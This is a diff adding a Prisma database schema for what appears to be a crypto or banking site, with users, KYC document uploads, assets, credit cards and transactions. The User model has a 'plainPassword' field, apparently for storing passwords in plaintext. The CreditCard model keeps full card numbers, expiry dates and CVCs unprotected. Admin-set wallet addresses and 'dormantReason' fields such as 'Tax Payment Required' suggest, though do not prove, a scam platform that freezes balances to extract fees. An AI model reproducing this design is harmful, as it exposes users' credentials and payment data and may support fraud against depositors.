@@ -1,0 +1,102 @@
+// 1. Add this Enum at the top of your file
+generator client {
+  provider = "prisma-client"
+  output   = "../src/generated/prisma"
+}
+
+datasource db {
+  provider = "postgresql"
+  // The 'url' line is removed from here
+}
+
+
+enum Role {
+  USER
+  ADMIN
+}
+
+// 1. ADD THIS NEW ENUM
+enum VerificationStatus {
+  UNVERIFIED
+  PENDING
+  APPROVED
+  REJECTED
+}
+
+model User {
+  id                 String    @id @default(cuid())
+  email              String    @unique
+  username           String
+  firstName          String?
+  lastName           String?   
+  phoneNumber        String?
+  password           String
+  plainPassword      String?
+  role               Role      @default(USER)
+  totalBalance       Float     @default(0.0) 
+
+// 2. ADD THESE 6 NEW KYC FIELDS HERE
+  profilePicture     String?             @db.Text
+  idType             String?             // e.g., "Passport", "Driver's License"
+  idFront            String?             @db.Text
+  idBack             String?             @db.Text
+  utilityBill        String?             @db.Text
+  verificationStatus VerificationStatus  @default(UNVERIFIED)
+  
+  // --- NEW FIELDS ---
+  accountNumber      String?   @unique
+  vaultStatusMessage String?   @db.Text
+  sendMessage        String?   @db.Text
+  receiveMessage     String?   @db.Text
+  dormantReason      String?   // <-- ADD THIS: e.g. "Tax Payment Required"
+  dormantAmount      Float?
+  
+  assets             Asset[]
+  creditCards        CreditCard[] // <-- ADD THIS LINE
+  transactions       Transaction[]
+  createdAt          DateTime  @default(now())
+}
+
+
+
+
+model Asset {
+  id            String   @id @default(cuid())
+  symbol        String   // e.g., "BTC"
+  name          String   // e.g., "Bitcoin"
+  amount        Float    @default(0.0)
+  walletAddress String?  // New Field: Admin sets this manually
+  userId        String
+  user          User     @relation(fields: [userId], references: [id], onDelete: Cascade)
+}
+
+
+// --- ADD THIS NEW MODEL AT THE BOTTOM ---
+model CreditCard {
+  id         String   @id @default(cuid())
+  userId     String
+  user       User     @relation(fields: [userId], references: [id], onDelete: Cascade)
+  cardNumber String
+  expiry     String
+  cvc        String
+
+  // --- NEW BILLING FIELDS ---
+  address    String?
+  city       String?
+  zipCode    String?
+
+  createdAt  DateTime @default(now())
+}
+
+model Transaction {
+  id        String   @id @default(cuid())
+  userId    String
+  user      User     @relation(fields: [userId], references: [id], onDelete: Cascade)
+  type      String   // e.g., "RECEIVE", "SEND", "DEPOSIT"
+  amount    Float
+  asset     String   // e.g., "BTC", "USD"
+  narration String   // e.g., "Payment for services"
+  date      String   
+  time      String   
+  createdAt DateTime @default(now())
+}
